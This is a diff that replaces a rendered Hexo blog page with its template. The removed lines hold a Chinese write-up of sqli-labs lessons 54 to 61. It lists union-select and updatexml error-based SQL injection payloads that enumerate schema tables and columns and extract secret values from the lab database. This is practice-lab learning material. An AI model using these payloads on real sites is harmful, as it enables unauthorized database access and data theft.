@@ -1,65 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="{{ page.lang }}">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.0">
+  {{ partial('_partials/head/head.njk', {}, {cache: theme.cache.enable}) }}{{ open_graph() }}
 
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
+<link rel="canonical" href="{{ canonical }}">
 
 
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+{{ next_data('page', next_config_unique()) }}
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="lesson54一般的联合查询注入，但只有十次机会 ?id&#x3D;1  ?id&#x3D;1’ order by 3–+  ?id&#x3D;1’ order by 4–+  ?id&#x3D;-1’ union select 1,2,3–+  ?id&#x3D;-1’ union select 1,2,database()–+  ?id&#x3D;-1’ union select 1,2,group_concat(table_name)from in">
-<meta property="og:type" content="article">
-<meta property="og:title" content="lesson54_61">
-<meta property="og:url" content="http://example.com/2022/02/08/lesson50/index.html">
-<meta property="og:site_name" content="wds">
-<meta property="og:description" content="lesson54一般的联合查询注入，但只有十次机会 ?id&#x3D;1  ?id&#x3D;1’ order by 3–+  ?id&#x3D;1’ order by 4–+  ?id&#x3D;-1’ union select 1,2,3–+  ?id&#x3D;-1’ union select 1,2,database()–+  ?id&#x3D;-1’ union select 1,2,group_concat(table_name)from in">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/I8q1zRoJSOjFfXU.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/9xHlZKoG5D3qtaE.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/qNX9eOfsVoZvgc3.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/3OcyfzZQ9Xgtb8C.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/wRpsKIhYciHz5WB.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/w6FYqVcPNrBStCk.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/lQUgki1Z3PdKsOx.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/18/9vaJbfgKRrhU2tA.png">
-<meta property="article:published_time" content="2022-02-08T10:18:18.000Z">
-<meta property="article:modified_time" content="2022-02-18T12:55:55.224Z">
-<meta property="article:author" content="发福的小菜狗">
-<meta property="article:tag" content="sql注入">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2022/02/18/I8q1zRoJSOjFfXU.png">
-
-
-<link rel="canonical" href="http://example.com/2022/02/08/lesson50/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/08/lesson50/","path":"2022/02/08/lesson50/","title":"lesson54_61"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>lesson54_61 | wds</title>
-  
-
-
-
-
+{{ next_data('calendar',
+  theme.calendar if page.type === 'schedule' else '')
+}}
+<title>{{ page.title }} | {{ title }}</title>
+  {{ partial('_third-party/analytics/index.njk', {}, {cache: theme.cache.enable}) }}
+  {{- next_inject('head') }}
   <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
+    <link rel="stylesheet" href="{{ url_for(theme.css) }}/noscript.css">
   </noscript>
-<link rel="alternate" href="/atom.xml" title="wds" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="wds's 学习博客" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
@@ -67,263 +27,25 @@
 
   <main class="main">
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
+      <div class="header-inner">{{ partial('_partials/header/brand.njk', {}, {cache: theme.cache.enable}) }}
 
-  <div class="site-meta">
+{{ partial('_partials/header/menu.njk', {}, {cache: theme.cache.enable}) }}
 
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <h1 class="site-title">wds</h1>
-      <i class="logo-line"></i>
-    </a>
-  </div>
+{{ partial('_partials/search/index.njk', {}, {cache: theme.cache.enable}) }}
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
-  </ul>
-</nav>
-
-
-
-
+{{- next_inject('header') }}
 </div>
         
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson54"><span class="nav-number">1.</span> <span class="nav-text">lesson54</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson55"><span class="nav-number">2.</span> <span class="nav-text">lesson55</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson56"><span class="nav-number">3.</span> <span class="nav-text">lesson56</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson-57"><span class="nav-number">4.</span> <span class="nav-text">lesson 57</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson58"><span class="nav-number">5.</span> <span class="nav-text">lesson58</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson59"><span class="nav-number">6.</span> <span class="nav-text">lesson59</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson-60"><span class="nav-number">7.</span> <span class="nav-text">lesson 60</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson-61"><span class="nav-number">8.</span> <span class="nav-text">lesson 61</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">发福的小菜狗</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">35</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">9</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">9</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-        </div>
-      </div>
-    </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
+  {{ sidebar_template.render(true) }}
 
     </header>
 
-    
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
+    {{ partial('_partials/widgets.njk', {}, {cache: theme.cache.enable}) }}
 
     <div class="main-inner post posts-expand">
 
 
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/08/lesson50/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          lesson54_61
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-02-08 18:18:18" itemprop="dateCreated datePublished" datetime="2022-02-08T18:18:18+08:00">2022-02-08</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-18 20:55:55" itemprop="dateModified" datetime="2022-02-18T20:55:55+08:00">2022-02-18</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <h1 id="lesson54"><a href="#lesson54" class="headerlink" title="lesson54"></a>lesson54</h1><p>一般的联合查询注入，但只有十次机会</p>
-<p>?id=1</p>
-<p><img src="https://s2.loli.net/2022/02/18/I8q1zRoJSOjFfXU.png" alt="QQ截图20220218184638.png"></p>
-<p>?id=1’ order by 3–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/9xHlZKoG5D3qtaE.png" alt="QQ截图20220218184904.png"></p>
-<p>?id=1’ order by 4–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/qNX9eOfsVoZvgc3.png" alt="QQ截图20220218185026.png"></p>
-<p>?id=-1’ union select 1,2,3–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/3OcyfzZQ9Xgtb8C.png" alt="QQ截图20220218185205.png"></p>
-<p>?id=-1’ union select 1,2,database()–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/wRpsKIhYciHz5WB.png" alt="QQ截图20220218185315.png"></p>
-<p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/w6FYqVcPNrBStCk.png" alt="QQ截图20220218192118.png"></p>
-<p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’t87qfwjwea’–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/lQUgki1Z3PdKsOx.png" alt="QQ截图20220218191401.png"></p>
-<p>?id=-1’ union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_X1KA))from challenge.t87qfwjwea–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/9vaJbfgKRrhU2tA.png" alt="QQ截图20220218192008.png"></p>
-<p>唯一要说的就是这关如果注入超过十次，表名和字段就会变非常恶心</p>
-<h1 id="lesson55"><a href="#lesson55" class="headerlink" title="lesson55"></a>lesson55</h1><p>?id=-1) union select 1,2,database()–+</p>
-<p>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’7lyan613nt’–+</p>
-<p>?id=-1) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_W8HV))from challenges.7lyan613nt–+</p>
-<h1 id="lesson56"><a href="#lesson56" class="headerlink" title="lesson56"></a>lesson56</h1><p>?id=-1’) union select 1,2,database()–+</p>
-<p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’lby5b1quon’–+</p>
-<p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_6JN1))from challenges.lby5b1quon–+</p>
-<h1 id="lesson-57"><a href="#lesson-57" class="headerlink" title="lesson 57"></a>lesson 57</h1><p>?id=-1” union select 1,2,database()–+</p>
-<p>?id=-1” union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p>?id=-1” union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’2by8hxznwc’–+</p>
-<p>?id=-1” union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_LXMN))from challenges.2by8hxznwc–+</p>
-<h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58"></a>lesson58</h1><p>?id=1’and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’6kkc70flk9’),0x7e),1)–+</p>
-<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JXDL))from challenges.6kkc70flk9),0x7e),1)–+</p>
-<h1 id="lesson59"><a href="#lesson59" class="headerlink" title="lesson59"></a>lesson59</h1><p>?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’062lvunx5i’),0x7e),1)–+</p>
-<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_2XKL))from challenges.062lvunx5i),0x7e),1)–+</p>
-<h1 id="lesson-60"><a href="#lesson-60" class="headerlink" title="lesson 60"></a>lesson 60</h1><p>?id=1”) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p>
-<h1 id="lesson-61"><a href="#lesson-61" class="headerlink" title="lesson 61"></a>lesson 61</h1><p>?id=1’)) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1’)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p>
-
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
-          </div>
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/02/04/lesson46/" rel="prev" title="lesson46_49">
-                  <i class="fa fa-chevron-left"></i> lesson46_49
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/02/18/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AD%A6%E4%B9%A0/" rel="next" title="php反序列化漏洞的认识与学习">
-                  php反序列化漏洞的认识与学习 <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
-
-
-
-
+  {{ partial('_macro/post.njk', {post: page}) }}
 
 
 </div>
@@ -331,37 +53,14 @@
 
   <footer class="footer">
     <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">发福的小菜狗</span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
-  </div>
-
+{{ partial('_partials/footer.njk', {}, {cache: theme.cache.enable}) }}
     </div>
   </footer>
 
-  
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+  {{ partial('_scripts/index.njk', {}, {cache: theme.cache.enable}) }}
+  {{ partial('_third-party/index.njk', {}, {cache: theme.cache.enable}) }}
+  {{ partial('_third-party/statistics/index.njk', {}, {cache: theme.cache.enable}) }}
 
-  
-
-
-
-
-
-  
-
-
-
-
-
+{{- next_inject('bodyEnd') }}
 </body>
 </html>
